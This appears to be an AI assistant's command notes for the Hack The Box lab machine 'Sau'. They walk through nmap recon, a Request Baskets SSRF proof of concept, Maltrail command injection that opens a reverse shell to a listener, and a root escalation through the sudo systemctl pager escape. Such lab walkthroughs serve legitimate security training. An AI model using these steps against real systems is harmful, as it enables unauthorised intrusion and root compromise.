Got it! Here's a clean version of the command notes for **HTB: Sau**, grouped by stage and purpose, with no CVE code — just the link references:

---

# 💎 HTB: Sau - Command Notes

## 🔍 Recon

```bash
nmap -p- --min-rate 10000 10.10.11.224  # Full TCP port scan
nmap -p 22,55555 -sCV 10.10.11.224      # Service/version detection on discovered ports
```

> Open ports: 22 (SSH), 55555 (HTTP - Request Baskets service)

---

## 🧪 SSRF Exploitation (CVE-2023-27163)

**Tool/POC**:  
[Request Baskets SSRF GitHub PoC](https://github.com/entr0pie/CVE-2023-27163)

```bash
./cve-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80
```

> Uses SSRF to proxy internal services (e.g., Mailtrail on localhost)

---

## 🐚 Command Injection via Mailtrail (v0.53)

**Tool/POC**:  
[Mailtrail RCE GitHub Repo](https://github.com/sf7-sf7/Mailtrail-RCE)

```bash
nc -lvnp 443  # Listener

# Adjusted Mailtrail RCE script to target SSRF basket URL:
python mailtrail_rce.py 10.10.14.6 443 http://10.10.11.224:55555/<basket-id>
```

> Drops a reverse shell as `puma`

---

## 🧑‍💻 Shell Upgrade

```bash
script /dev/null -c bash
# Press Ctrl+Z
stty raw -echo; fg
reset
```

> Stabilizes the reverse shell

---

## 🧠 Privilege Escalation - Root via `less` + `systemctl`

```bash
sudo -l
# Shows: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

sudo /usr/bin/systemctl status trail.service
# If output opens in less, type: !sh
```

> Less pager exploit: gain interactive shell as root via `!sh`

---

## 📂 Flags

```bash
cat /home/puma/user.txt
cat /root/root.txt
```

--- 

Let me know if you want the same structure for another box! 🧩📜